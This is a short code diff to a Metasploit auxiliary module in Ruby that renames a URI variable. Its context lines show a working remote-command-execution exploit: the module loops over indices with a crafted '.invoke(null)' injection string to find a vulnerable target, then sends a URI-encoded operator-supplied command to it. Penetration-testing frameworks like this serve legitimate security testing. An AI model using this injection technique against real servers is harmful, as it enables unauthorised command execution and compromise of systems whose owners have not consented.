@@ -43,7 +43,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run
-		jbr = normalize_uri(target_uri.to_s)
+		uri = normalize_uri(target_uri.to_s)
 		cmd_enc = ""
 		cmd_enc << Rex::Text.uri_encode(datastore["CMD"])
 
@@ -55,7 +55,7 @@ class Metasploit3 < Msf::Auxiliary
 		uri_part_3 = "].invoke(null),'"
 
 		25.times do |index|
-			req = jbr + uri_part_1 + index.to_s + "]}"
+			req = uri + uri_part_1 + index.to_s + "]}"
 
 			res = send_request_cgi(
 				{
@@ -78,7 +78,7 @@ class Metasploit3 < Msf::Auxiliary
 			print_status("Target appears VULNERABLE!")
 			print_status("Sending remote command:" + datastore["CMD"])
 
-			req = jbr + uri_part_1 + flag_found_one.to_s + uri_part_2 + flag_found_two.to_s + uri_part_3 + cmd_enc + "')}"
+			req = uri + uri_part_1 + flag_found_one.to_s + uri_part_2 + flag_found_two.to_s + uri_part_3 + cmd_enc + "')}"
 
 			res = send_request_cgi(
 				{
